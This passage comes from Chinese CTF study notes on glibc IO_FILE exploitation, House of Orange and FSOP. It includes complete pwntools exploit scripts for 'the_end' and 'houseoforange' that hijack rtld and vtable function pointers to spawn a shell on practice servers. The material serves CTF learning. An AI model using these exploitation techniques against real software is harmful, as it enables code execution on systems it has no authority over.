_dl_load_write_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER , #endif . _dl_nns = 1 , . _dl_ns = { #ifdef _LIBC_REENTRANT [ LM_ID_BASE ] = { . _ns_unique_sym_table = { . lock = _RTLD_LOCK_RECURSIVE_INITIALIZER } } #endif } }; //Ldsodefs.h #ifndef SHARED # define EXTERN extern # define GL(name) _##name #else # define EXTERN # if IS_IN (rtld) # define GL(name) _rtld_local._##name # else # define GL(name) _rtld_global._##name # endif \u6709\u70b9\u590d\u6742\uff0c\u8fd9\u91cc\u7b80\u5316\u63cf\u8ff0\u4e00\u4e0b\uff1a\u4ece 40-45 \u77e5\u9053 GL \u662f _rtld_local \u6216 _rtld_global \u7c7b\u578b\u7684\u7ed3\u6784\u4f53\uff1b\u4e24\u79cd\u7ed3\u6784\u4f53\u5b9a\u4e49\u770b\u4e0a\u9762\u4ee3\u7801\u524d\u9762\u90e8\u5206\u3002\u6240\u4ee5 GL(dl_rtld_lock_recursive) \u662f _rtld_global \u7ed3\u6784\u4f53\u5185\u7684 dl_rtld_lock_recursive \u6307\u9488\u3002 \u6709\u70b9\u7ed5\uff0c\u5148\u6574\u7406\u4e0b _dl_fini \u8c03\u7528\u7684\u5b9e\u9645\u662f\u4ec0\u4e48\uff1a _dl_fini \u8c03\u7528 __rtld_lock_lock_recursive __rtld_lock_lock_recursive \u5b8f\u5b9a\u4e49\u4e3a GL(dl_rtld_lock_recursive) GL \u662f\u4e00\u4e2a _rtld_global \u7ed3\u6784\u4f53 dl_rtld_lock_recursive \u662f _rtld_global \u7ed3\u6784\u4f53\u7684\u4e00\u4e2a\u6307\u9488 _dl_fini \u5b9e\u9645\u8c03\u7528 _rtld_global \u7ed3\u6784\u4f53\u7684 _dl_rtld_lock_recursive \u6307\u9488\u3002 \u5728 gdb \u4e2d\u67e5\u770b _rtld_global \u4fe1\u606f\uff1a p _rtld_global#\u67e5\u770b\u7ed3\u6784\u4f53\u5185\u5bb9 p *_rtld_global#\u67e5\u770b\u7ed3\u6784\u4f53\u5730\u5740 \u5728\u7ed3\u6784\u4f53\u91cc\u9762\u627e\u5230\u4e86\u5b9e\u9645\u7684\u8c03\u7528\u7684\u51fd\u6570\u6307\u9488\uff1a **_rtld_global \u662f\u5728 ld.so \u5185\u5b58\u6bb5**\u91cc\u9762\u7684\uff0c\u6cc4\u9732 libc \u53ef\u4ee5\u901a\u8fc7\u504f\u79fb\u8ba1\u7b97\u51fa ld \u57fa\u5730\u5740\uff0c\u6309\u7167\u56fe\u4e2d\u504f\u79fb\u5e94\u8be5\u4e3a offset=0x7f30c73af000-0x7f30c6df8000=0x5b7000 \uff1a \u7531\u4e8e\u6211\u8fd9\u91cc\u8c03\u8bd5\u65f6\u6539 libc \u548c ld \u6240\u4ee5\u8ba1\u7b97\u51fa\u6765\u7684\u504f\u79fb 0x5b7000 \u5e76\u4e0d\u662f\u8fdc\u7a0b\u73af\u5883\uff08\u539f\u751f18.04\u8fd0\u884c\uff09\u4e0b\u7684\u504f\u79fb\uff0c\u5728 Ubuntu 18.04 \u4e0b\u91cd\u65b0\u8c03\u8bd5\u8ba1\u7b97\u5f97\u51fa\u504f\u79fb\u4e3a 0x3f1000 \uff0c\u8fd9\u4e2a\u504f\u79fb\u4e0e buu \u4e0a\u7684\u73af\u5883\u4e00\u6837\uff1a \u8ba1\u7b97\u51fa _rtld_global \u7684\u5730\u5740\u901a\u8fc7\u504f\u79fb\u5f97\u5230 _dl_rtld_lock_recursive \u3001_dl_rtld_unlock_recursive \u5730\u5740\u3002\u8fd9\u4e2a\u504f\u79fb\u6211\u662f gdb \u67e5\u770b _rtld_global \u5730\u5740\uff0c\u4e0d\u65ad\u52a0\u504f\u79fb\u627e\uff1a _dl_rtld_lock_lock_recursive -> 0xf00 _dl_rtld_lock_unlock_recursive -> 0xf08 \u4e24\u4e2a\u51fd\u6570\u90fd\u4f1a\u8c03\u7528\uff0c\u5c06\u5176\u6307\u9488\u6539\u6210 onegadget \uff0c\u6700\u540e\u5c1d\u8bd5 _dl_rtld_unlock_recursive \u624d\u6ee1\u8db3 onegadget \u6761\u4ef6\u3002 EXP \u5982\u4e0b\uff1a #remote:ubuntu18.04 from pwn import * context ( log_level = 'debug' , arch = 'amd64' , os = 'linux' , terminal = [ 'tmux' , 'sp' , '-h' ]) #p = process([\"/glibc/2.27/64/lib/ld-2.27.so\", \"./the_end\"], env={\"LD_PRELOAD\":\"/glibc/2.27/64/lib/libc-2.27.so\"}) #libc = ELF(\"/glibc/2.27/64/lib/libc-2.27.so\") #ld = ELF(\"/glibc/2.27/64/lib/ld-2.27.so\") # p = process(\"./the_end\") # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") # ld = ELF(\"/lib/x86_64-linux-gnu/ld-2.27.so\") p = remote ( \"node3.buuoj.cn\" , 27518 ) libc = ELF ( \"./libc-2.27.so\" ) ld = ELF ( \"/lib/x86_64-linux-gnu/ld-2.27.so\" ) elf = ELF ( \"./the_end\" ) offset_ldbase_of_libcbase = 0x3f1000 #0x5b7000 offset_dl_rtld_lock_recursive_of_rtld_global = 0xf00 offset_dl_rtld_unlock_recursive_of_rtld_global = 0xf08 p . recvuntil ( \"gift \" ) sleep_addr = int ( p . recv ( 14 ), 16 ) log . info ( \"sleep_addr:\" + hex ( sleep_addr )) libc_base = sleep_addr - libc . sym [ 'sleep' ] log . info ( \"libc_base:\" + hex ( libc_base )) ld_base = libc_base + offset_ldbase_of_libcbase log . info ( \"ld_base:\" + hex ( ld_base )) rtld_global = ld_base + ld . sym [ '_rtld_global' ] log . info ( \"rtld_global:\" + hex ( rtld_global )) dl_rtld_lock_recursive = rtld_global + offset_dl_rtld_lock_recursive_of_rtld_global log . info ( \"dl_rtld_lock_recursive:\" + hex ( dl_rtld_lock_recursive )) dl_rtld_unlock_recursive = rtld_global + offset_dl_rtld_unlock_recursive_of_rtld_global log . info ( \"dl_rtld_unlock_recursive_of_rtld_global:\" + hex ( dl_rtld_unlock_recursive )) onegadget = libc_base + 0x4f322 ''' 0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp & 0xf == 0 rcx == NULL 0x4f322 execve(\"/bin/sh\", rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' #gdb.attach(p,\"b *$rebase(0x964)\") for i in range ( 5 ): #p.send(p64(dl_rtld_lock_recursive+i)) p . send ( p64 ( dl_rtld_unlock_recursive + i )) p . send ( p64 ( onegadget )[ i ]) p . sendline ( \"exec 1>&0\" ) p . interactive () House of orange \u00b6 \u6982\u8ff0 \u00b6 house of orange \u7279\u6b8a\u4e4b\u5904\u662f\u9898\u76ee\u6ca1\u6709 free \u51fd\u6570\u7b49\u91ca\u653e\u5806\u5757\u51fd\u6570\u3002house of orange \u6838\u5fc3\u601d\u60f3\u901a\u8fc7\u6f0f\u6d1e\u5b9e\u73b0 free \u7684\u6548\u679c\u3002 \u4f7f\u7528\u6761\u4ef6 \u00b6 \u80fd\u63a7\u5236 topchunk size \u4f4d\uff08\u5806\u6ea2\u51fa\u7b49\uff09 \u80fd\u63a7\u5236\u5806\u5206\u914d\u7684\u5927\u5c0f \u539f\u7406 \u00b6 \u5f53 topchunk \u4e0d\u80fd\u6ee1\u8db3\u7533\u8bf7\u5206\u914d\u7684\u5927\u5c0f\u65f6\uff0ctopchunk \u88ab\u91ca\u653e\u8fdb unsortedbin \uff0c\u5b9e\u73b0\u6ca1\u6709 free \u51fd\u6570\u91ca\u653e\u5806\u5757\u3002 \u6269\u5c55\u5806\u7a7a\u95f4\u6709 mmap \u548c brk \u4e24\u79cd\u65b9\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u4ee5 brk \u62d3\u5c55\uff0c\u9700\u8981\u7ed5\u8fc7 libc \u4e00\u4e9b check \uff1a malloc \u7533\u8bf7\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8e mmp_.mmap_threshold if (( unsigned long )( nb ) >= ( unsigned long )( mp_ . mmap_threshold ) && ( mp_ . n_mmaps < mp_ . n_mmaps_max )) \u603b\u7ed3\u4f2a\u9020 topchunk \u8981\u6c42\uff1a \u4f2a\u9020 size \u9700\u8981\u5bf9\u9f50\u5185\u5b58\u9875 \u6bd4\u5982\u73b0\u5728 topchunk size \u4e3a\uff1a 0x20fa1 \uff0c\u90a3\u4e48\u5bf9\u9f50\u5185\u5b58\u9875\u7684 size \u53ef\u4ee5\u4e3a\uff1a0xfa1\u30010x1fa1\u2026\u2026 size \u8981\u5927\u4e8e MINSIZE prev_inuse \u4e3a 1 size \u8981\u5c0f\u4e8e\u7b49\u7b49\u7533\u8bf7 chunk_size+MINISIZE \uff08\u624d\u80fd\u8ba9 topchunk \u653e\u5165 unsortedbin\uff09 \u81ea\u6b64\u5f97\u5230\u4e00\u4e2a unsortedbin \u5806\uff0c\u7528\u6765\u6cc4\u9732 libc \u5730\u5740\uff0c\u5b9e\u73b0 FSOP hitcon_2016_houseoforange \u00b6 \u57fa\u672c\u60c5\u51b5 \u00b6 \u4fdd\u62a4\u5168\u5f00\uff0c\u5b9e\u9a8c\u73af\u5883\u5728 Ubuntu16.04\u3002 \u80fd\u81ea\u4e3b\u63a7\u5236\u5206\u914d\u5806\u5927\u5c0f\uff0c\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a struct { * info ; chunk_ptr ; } struct info { price ; color ; } \u5728 edit \u51fd\u6570\u4e2d\u5b58\u5728\u5806\u6ea2\u51fa\uff1a \u601d\u8def \u00b6 \u5229\u7528\u5806\u6ea2\u51fa\u5c06 topchunk size \u6539\u5c0f\uff0csize \u8981\u6c42\u770b\u524d\u6587\u3002\u4fee\u6539\u524d topchunk \u548c heap \u8303\u56f4\uff1a \u4fee\u6539\u540e\u60c5\u51b5\uff1a \u4e4b\u540e\u7533\u8bf7\u4e00\u4e2a\u5927\u4e8e topchunk \u7684\u5806\uff0ctopchunk \u5c31\u88ab\u653e\u5165 unsortedbin \uff1a pwndbg> bin fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x5555557580a0 \u2014\u25b8 0x7ffff7dd1b78 ( main_arena+88 ) \u25c2\u2014 0x5555557580a0 \u7533\u8bf7\u4e00\u4e2a largebin \u7528\u4e8e\u6cc4\u9732 libc \u548c \u5806\u5730\u5740\u3002\u7528\u7684 malloc \u5206\u914d\uff0clibc \u8bfb\u53d6 bk \u4f4d\u7f6e\u4fe1\u606f\u5373\u53ef\uff0c\u5206\u914d\u7684\u662f largebin \u5728 fd_nextsize \u548c bk_nextsize \u90fd\u5b58\u653e\u5806\u5730\u5740\u5206\u522b\u8bfb\u51fa\u5373\u53ef\u3002\u5806\u5730\u5740\u5728 FSOP \u4f2a\u9020 vtable \u9700\u8981\u7528\u5230\u3002 \u81ea\u6b64\u540e\u9762\u5c31\u662f FSOP \u5229\u7528\u3002\u52ab\u6301\u5728 libc \u4e2d\u7684 _IO_list_all \u5185\u5bb9\uff0c\u5c06\u5176\u5185\u5bb9\u6307\u5411\u53ef\u63a7\u5730\u5740\u4f2a\u9020 _IO_FILE_plus \u548c vtabel \u3002\u9ed8\u8ba4\u72b6\u6001\u4e0b\u7684 _IO_list_all \u6307\u5411\u7684\u662f _IO_2_1_stderr_ \uff1a \u5229\u7528\u5806\u6ea2\u51fa\u4fee\u6539\u5728 unsortedbin \u7684 topchunk fd bk \u6307\u9488\uff0c\u53d1\u8d77 unsortedbin attack \u52ab\u6301 _IO_list_all \u3002\u8fd9\u91cc\u4fee\u6539\u5b8c fd bk \u4e4b\u540e\u7533\u8bf7\u4e00\u4e2a\u5806\uff0ctopchunk unlink \u5c31\u4f1a\u4fee\u6539 _IO_list_all \u6307\u5411\u5230 main_arena+88 \uff0c\u8fd9\u4e2a\u533a\u57df\u524d\u540e\u6211\u4eec\u8fd8\u662f\u4e0d\u80fd\u63a7\u5236\uff0c\u5c31\u5229\u7528 _chain \u6807\u5fd7\u4f4d\u6307\u5411\u4e0b\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u8fd9\u4e2a\u6807\u5fd7\u4f4d\u7684\u4f4d\u7f6e\u521a\u597d\u662f unsortedbin 0x60 \u94fe\u8868\u4f4d\u7f6e\u3002\u56e0\u6b64\u5c06 topchunk size \u8986\u76d6\u4e3a 0x60 \uff1a \u6267\u884c _IO_flush_all_lockp \u65f6\u9010\u4e2a\u904d\u5386\u6587\u4ef6\u6d41\uff0c\u9047\u5230\u9519\u8bef\u6587\u4ef6\u5c31\u8df3\u8fc7\u53bb\u5904\u7406 _chain \u6307\u5411\u7684\u4e0b\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u56e0\u6b64\u73b0\u5728 topchunk \u91cc\u9762\u4f2a\u9020\u4e00\u4e2a _IO_FILE_plus \u7ed3\u6784\u4f53\u3002 \u9700\u8981\u8bbe\u7f6e\u51e0\u4e2a\u6807\u5fd7\u4f4d\u7ed5\u8fc7\u4fdd\u62a4\uff1a mode_offset = 0x0 ; writeptr_offset = 0x1 ; writebase_offset = 0x0 ; \u7136\u540e\u5c06 vtable \u6307\u9488\u52ab\u6301\u4f1a topchunk \u7279\u5b9a\u4f4d\u7f6e\uff0c\u8ba9 __overflow \u4e3a system \uff0c\u6587\u4ef6\u6d41\uff08topchunk\uff09\u5934\u90e8\u8986\u76d6\u4e3a /bin/sh \u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u3002 \u6210\u529f\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a EXP \u00b6 from pwn import * context ( log_level = 'debug' , arch = 'amd64' ) # p = process(\"./houseoforange_hitcon_2016\") # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") p = remote ( \"node3.buuoj.cn\" , 29595 ) libc = ELF ( \"./libc-2.23.so\" ) elf = ELF ( \"./houseoforange_hitcon_2016\" ) def command ( id ): p . recvuntil ( \": \" ) p . sendline ( str ( id )) def add ( size , content , price , color ): command ( 1 ) p . recvuntil ( \"Length of name :\" ) p . sendline ( str ( size )) p . recvuntil ( \"Name :\" ) p . send ( content ) p . recvuntil ( \"Price of Orange:\" ) p . sendline ( str ( price )) p . recvuntil ( \"Color of Orange:\" ) p . sendline ( str ( color )) def show (): command ( 2 ) def edit ( size , content , price , color ): command ( 3 ) p . recvuntil ( \"Length of name :\" ) p . sendline ( str ( size )) p . recvuntil ( \"Name:\" ) p . send ( content ) p . recvuntil ( \"Price of Orange:\" ) p . sendline ( str ( price )) p . recvuntil ( \"Color of Orange:\" ) p . sendline ( str ( color )) # step1 'free' 2 bin add ( 0x18 , 'a' * 8 , 0xddaa , 0xddaa ) payload = 'a' * 0x38 + p64 ( 0xfa1 ) edit ( len ( payload ), payload , 0xddaa , 0xddaa ) add ( 0x1000 , 'b' * 8 , 0xddaa , 0xddaa ) #0x555555758000 0x555555779000 rw-p 21000 0 [heap] #0x555555758000 0x55555579b000 rw-p 43000 0 [heap] # step2 leak libc add ( 0x450 , 'c' * 8 , 0xddaa , 0xddaa ) show () p . recvuntil ( 'c' * 8 ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_addr = leak_addr - 1640 - 0x3c4b20 log . info ( \"libc_addr:\" + hex ( libc_addr )) IO_list_all = libc_addr + libc . sym [ '_IO_list_all' ] log . info ( \"IO_list_all:\" + hex ( IO_list_all )) system = libc_addr + libc . sym [ 'system' ] # step3 leak heap payload = 'd' * 0x10 edit ( 0x10 , payload , 0xddaa , 0xddaa ) show () p . recvuntil ( 'd' * 0x10 ) heap_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"heap_addr:\" + hex ( heap_addr )) # set fake struct payload = 'd' * 0x450 + p64 ( 0 ) + p64 ( 0x21 ) + p64 ( 0x0000ddaa00000003 ) + p64 ( 0 ) fake = '/bin/sh \\x00 ' + p64 ( 0x61 ) fake += p64 ( 0 ) + p64 ( IO_list_all - 0x10 ) fake += p64 ( 0 ) + p64 ( 1 ) fake = fake . ljust ( 0xc0 , ' \\x00 ' ) fake += p64 ( 0 ) * 3 fake += p64 ( heap_addr + 0x558 ) #vtable fake += p64 ( 0 ) * 2 fake += p64 ( system ) payload += fake edit ( len ( payload ), payload , 2 , 3 ) #gdb.attach(p) # unlink attack p . recvuntil ( \"Your choice : \" ) p . sendline ( '1' ) p . interactive () \u53c2\u8003\u6587\u7ae0 \u00b6 ctf-HITCON-2016-houseoforange\u5b66\u4e60 houseoforange_hitcon_2016\uff08House of orange\uff0c unsorted bin attack\uff0cFSOP\uff09 house_of_orange \u53c2\u8003\u6587\u7ae0 \u00b6 IO_FILE:2018 HCTF the_end 4.13 \u5229\u7528 _IO_FILE \u7ed3\u6784 IO_FILE Related IO file\u7ed3\u6784\u5728pwn\u4e2d\u7684\u5999\u7528 IO_FILE Pwn \u5229\u7528\u6574\u7406 \u7528 fwrite \u7b49\u8fd9\u79cd\u6d41 I/O \u51fd\u6570\u5199\u5165\u5199\u51fa\uff0c\u6570\u636e\u4f1a\u5148\u653e\u5728\u7f13\u51b2\u533a\uff0c\u5e76\u6ca1\u6709\u771f\u6b63\u8f93\u5165\u6216\u8005\u8f93\u51fa\uff0c\u9700\u8981\u7528 fflush \u51b2\u6d17\u6d41\u4e2d\u4fe1\u606f\u624d\u5b8c\u6210\u5199\u5165\u5199\u51fa\u3002\u907f\u514d\u7528 fflush \u51b2\u6d17\u5c31\u7528 setbuf \u51fd\u6570\u5173\u95ed\u7f13\u51b2\uff08pwn \u9898\u521d\u59cb\u5316\u5fc5\u5907\uff09 \u21a9","title":"Pwn_IO_FILE"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#pwn-_io_file","text":"","title":"Pwn _IO_FILE"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#io","text":"","title":"IO \u7ed3\u6784\u4f53\u77e5\u8bc6"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_io_file","text":"FILE \u5728 Linux \u7cfb\u7edf\u7684\u6807\u51c6 IO \u5e93\u4e2d\u662f\u7528\u4e8e\u63cf\u8ff0\u6587\u4ef6\u7684\u7ed3\u6784\uff0c\u79f0\u4e3a\u6587\u4ef6\u6d41\u3002 FILE \u7ed3\u6784\u5728\u7a0b\u5e8f\u6267\u884c fopen \u7b49\u51fd\u6570\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\uff0c\u5e76\u5206\u914d\u5728\u5806\u4e2d\u3002\u6211\u4eec\u5e38\u5b9a\u4e49\u4e00\u4e2a\u6307\u5411 FILE \u7ed3\u6784\u7684\u6307\u9488\u6765\u63a5\u6536\u8fd9\u4e2a\u8fd4\u56de\u503c\u2014\u2014\u6587\u4ef6\u63cf\u8ff0\u7b26\uff08eg:stdin=0;stdout=1)\u3002 \u5728\u6807\u51c6 I/O \u5e93\u4e2d\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u542f\u52a8\u65f6\u6709\u4e09\u4e2a\u6587\u4ef6\u6d41\u662f\u81ea\u52a8\u6253\u5f00\u7684\uff1a stdin\u3001stdout\u3001stderr\uff0c\u5206\u522b\u5bf9\u5e94\u6587\u4ef6\u63cf\u8ff0\u7b26\uff1a0\u30011\u30012 \u3002\u5047\u8bbe\u73b0\u5728\u7b2c\u4e00\u6b21\u7528 fopen \u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u8fd9\u4e2a\u6587\u4ef6\u6d41\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u5c31\u4e3a 3 \u3002\u9ed8\u8ba4\u6253\u5f00\u7684\u4e09\u4e2a\u6587\u4ef6\u6d41\u5206\u914d libc data \u6bb5\u3002fopen \u7b49\u6587\u4ef6\u6d41\u63a7\u5236\u51fd\u6570\u521b\u5efa\u7684\u6587\u4ef6\u6d41\u662f\u5206\u914d\u5728\u5806\u4e0a\u3002 FILE \u7ed3\u6784\u4f53\u5b9a\u4e49\u5728 libio.h \uff1a struct _IO_FILE { int _flags ; /* High-order word is _IO_MAGIC; rest is flags. */ #define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char * _IO_read_ptr ; /* Current read pointer */ char * _IO_read_end ; /* End of get area. */ char * _IO_read_base ; /* Start of putback+get area. */ char * _IO_write_base ; /* Start of put area. */ char * _IO_write_ptr ; /* Current put pointer. */ char * _IO_write_end ; /* End of put area. */ char * _IO_buf_base ; /* Start of reserve area. */ char * _IO_buf_end ; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char * _IO_save_base ; /* Pointer to start of non-current get area. */ char * _IO_backup_base ; /* Pointer to first valid character of backup area */ char * _IO_save_end ; /* Pointer to end of non-current get area. */ struct _IO_marker * _markers ; struct _IO_FILE * _chain ; int _fileno ; #if 0 int _blksize; #else int _flags2 ; #endif _IO_off_t _old_offset ; /* This used to be _offset but it's too small. */ #define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column ; signed char _vtable_offset ; char _shortbuf [ 1 ]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t * _lock ; #ifdef _IO_USE_OLD_IO_FILE }; \u6bcf\u4e2a\u6587\u4ef6\u6d41\u90fd\u6709\u81ea\u5df1\u7684 FILE \u7ed3\u6784\u4f53 \u3002\u6211\u4eec\u53ef\u4ee5\u5728 libc.so \u4e2d\u627e\u5230 stdin\\stdout\\stderr \u7b49\u7b26\u53f7\uff0c\u8fd9\u4e9b\u7b26\u53f7\u662f\u6307\u5411 FILE \u7ed3\u6784\u7684\u6307\u9488\uff0c\u771f\u6b63\u7ed3\u6784\u7684\u7b26\u53f7\u662f _IO_2_1_stderr_ _IO_2_1_stdout_ _IO_2_1_stdin_ \u5728 ida \u4e2d\u641c\u7d22 _IO_2_1_stdxxx_ \u6216\u8005 stdxx \u8fd9\u4e2a\u53d8\u91cf\u4f1a\u5b58\u50a8 FILE \u7ed3\u6784\u4f53\u5730\u5740\uff1a gdb \u8c03\u8bd5\u4e2d\u67e5\u770b\u7ed3\u6784\u4f53\u5185\u5bb9\uff1a \u8fdb\u7a0b\u4e2d\u7684 FILE \u7ed3\u6784\u4f1a\u901a\u8fc7 _chain \u57df\u5f7c\u6b64\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff08\u4e0a\u56fe\u53ef\u89c1\u6307\u5411 _IO_2_1_strout \uff09\uff0c \u94fe\u8868\u5934\u90e8\u7528\u5168\u5c40\u53d8\u91cf _IO_list_all \u8868\u793a \uff0c\u901a\u8fc7\u8fd9\u4e2a\u503c\u6211\u4eec\u53ef\u4ee5\u904d\u5386\u6240\u6709\u7684 FILE \u7ed3\u6784\uff08FSOP \u653b\u51fb\u5229\u7528\u5230\u8fd9\u4e2a\u7279\u6027\uff09\u3002","title":"_IO_FILE \u7ed3\u6784"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_io_file_plus","text":"\u4f46\u662f\u4e8b\u5b9e\u4e0a _IO_FILE \u7ed3\u6784\u5916\u5305\u88f9\u7740\u53e6\u4e00\u79cd\u7ed3\u6784 _IO_FILE_plus \uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u91cd\u8981\u7684**\u6307\u9488 vtable \u6307\u5411\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\u6307\u9488**\u3002 \u5728 libc2.23 \u7248\u672c\u4e0b\uff0c32 \u4f4d\u7684 vtable \u504f\u79fb\u4e3a 0x94\uff0c64 \u4f4d\u504f\u79fb\u4e3a 0xd8 struct _IO_FILE_plus { _IO_FILE file ; _IO_jump_t * vtable ; } _IO_FILE_plus \u7ed3\u6784\u4f53&\u5404\u4e2a\u504f\u79fb\uff0c\u5f53\u4e2d 0x0 ~ 0xc4 \u5176\u5b9e\u5c31\u662f _IO_FILE \u7ed3\u6784\uff0c\u6700\u540e\u52a0\u4e0a vtable \u6307\u9488\u6307\u5411 _IO_jump_t \uff1a //p *((struct _IO_FILE_plus*)[\u5730\u5740]) 0x0 _flags 0x8 _IO_read_ptr 0x10 _IO_read_end 0x18 _IO_read_base 0x20 _IO_write_base 0x28 _IO_write_ptr 0x30 _IO_write_end 0x38 _IO_buf_base 0x40 _IO_buf_end 0x48 _IO_save_base 0x50 _IO_backup_base 0x58 _IO_save_end 0x60 _markers 0x68 _chain 0x70 _fileno 0x74 _flags2 0x78 _old_offset 0x80 _cur_column 0x82 _vtable_offset 0x83 _shortbuf 0x88 _lock //IO_FILE_complete 0x90 _offset 0x98 _codecvt 0xa0 _wide_data 0xa8 _freeres_list 0xb0 _freeres_buf 0xb8 __pad5 0xc0 _mode 0xc4 _unused2 0xd8 vtable","title":"_IO_FILE_plus \u7ed3\u6784"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_io_jump_t","text":"vtable \u662f _IO_jump_t \u7c7b\u578b\u7684\u6307\u9488\uff0c\u6307\u5411\u7684 _IO_jump_t \u7ed3\u6784\u4f53\u4e2d\u4fdd\u5b58\u4e86\u4e00\u5806\u51fd\u6570\u6307\u9488\uff0c\u8fd9\u6709\u70b9\u50cf c++ \u7684\u865a\u51fd\u6570\u7ed3\u6784\u4f53\uff0c\u5728\u540e\u9762\u6211\u4eec\u4f1a\u770b\u5230\u5728\u4e00\u7cfb\u5217\u6807\u51c6 IO \u51fd\u6570\u4e2d\u4f1a\u8c03\u7528\u8fd9\u91cc\u9762\u7684\u51fd\u6570\u6307\u9488\u3002 \u5728 ida \u4e2d\u53ef\u4ee5\u627e _IO_2_1_stderr_ \u7ed3\u6784\u4f53\u540e\u9762\u7684 dq offset _IO_file_jumps \u8df3\u8f6c\u5230\u7ed3\u6784\u4f53\u3002\u6216\u8005\u76f4\u63a5\u641c\u7d22 _IO_file_jumps \uff0cvtable \u5b9e\u9645\u6307\u5411\u7684\u7ed3\u6784\u4f53\u540d\u5b57\u3002 //p *((struct _IO_jump_t*)[\u5730\u5740]) void * funcs [] = { JUMP_FIELD ( size_t , __dummy ); JUMP_FIELD ( size_t , __dummy2 ); JUMP_FIELD ( _IO_finish_t , __finish ); JUMP_FIELD ( _IO_overflow_t , __overflow ); JUMP_FIELD ( _IO_underflow_t , __underflow ); JUMP_FIELD ( _IO_underflow_t , __uflow ); JUMP_FIELD ( _IO_pbackfail_t , __pbackfail ); /* showmany */ JUMP_FIELD ( _IO_xsputn_t , __xsputn ); JUMP_FIELD ( _IO_xsgetn_t , __xsgetn ); JUMP_FIELD ( _IO_seekoff_t , __seekoff ); JUMP_FIELD ( _IO_seekpos_t , __seekpos ); JUMP_FIELD ( _IO_setbuf_t , __setbuf ); JUMP_FIELD ( _IO_sync_t , __sync ); JUMP_FIELD ( _IO_doallocate_t , __doallocate ); JUMP_FIELD ( _IO_read_t , __read ); JUMP_FIELD ( _IO_write_t , __write ); JUMP_FIELD ( _IO_seek_t , __seek ); JUMP_FIELD ( _IO_close_t , __close ); JUMP_FIELD ( _IO_stat_t , __stat ); JUMP_FIELD ( _IO_showmanyc_t , __showmanyc ); JUMP_FIELD ( _IO_imbue_t , __imbue ); #if 0 get_column; set_column; #endif };","title":"_IO_jump_t \u7ed3\u6784"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_1","text":"stdin\u3001stdout\u3001stderr \u6587\u4ef6\u6d41\u4f4d\u4e8e libc.so \u7684\u6570\u636e\u6bb5\u3002\u800c\u6211\u4eec\u4f7f\u7528 fopen \u521b\u5efa\u7684\u6587\u4ef6\u6d41\u662f\u5206\u914d\u5728\u5806\u5185\u5b58\u4e0a stdin\u3001stdout\u3001stderr\uff0c\u5206\u522b\u5bf9\u5e94\u6587\u4ef6\u63cf\u8ff0\u7b26\uff1a0\u30011\u30012 \uff0c\u5f00\u542f\u65b0\u7684\u6587\u4ef6\u6d41\u6587\u4ef6\u63cf\u8ff0\u7b26\u4ece 3 \u5f00\u59cb\u9012\u589e \u6bcf\u4e2a\u6587\u4ef6\u6d41\u90fd\u5355\u72ec\u7684 _IO_FILE \u3001_IO_FILE_plus \u7ed3\u6784\u4f53\uff0c _IO_jump_t *vtable \u53ea\u6709\u4e00\u4e2a\u5404\u4e2a\u6587\u4ef6\u6d41\u516c\u7528 \u6307\u9488 vtable \u6307\u5411\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\u6307\u9488\uff0c\u5404\u79cd IO \u64cd\u4f5c\u5747\u662f\u901a\u8fc7 vtable \u6307\u5411\u5404\u4e2a\u5177\u4f53\u51fd\u6570\u5b9e\u73b0\u529f\u80fd \u6587\u4ef6\u6d41\u901a\u8fc7 _chain \u6784\u6210\u94fe\u8868\uff0c \u94fe\u8868\u5934\u90e8\u7528\u5168\u5c40\u53d8\u91cf _IO_list_all \u8868\u793a ida \u4e2d\u901a\u8fc7\u641c\u7d22\u6587\u4ef6\u6d41\u540d\u53ef\u4ee5\u627e\u5230 _IO_FILE \u3001_IO_FILE_plus \uff0c\u6839\u636e\u504f\u79fb\uff08\u7ed3\u6784\u4f53\u6700\u540e\u4f4d\u7f6e\uff09\u627e\u5230 vtable \uff08eg: IO_2_1_stderr )","title":"\u5c0f\u7ed3"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_2","text":"","title":"\u6d89\u53ca\u6587\u4ef6\u6d41\u90e8\u5206\u51fd\u6570"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#fread","text":"\u6d89\u53ca\u6e90\u7801\u6587\u4ef6\uff1a libio / iofread . c libio / genops . c libio / libioP . h libio / fileops . c 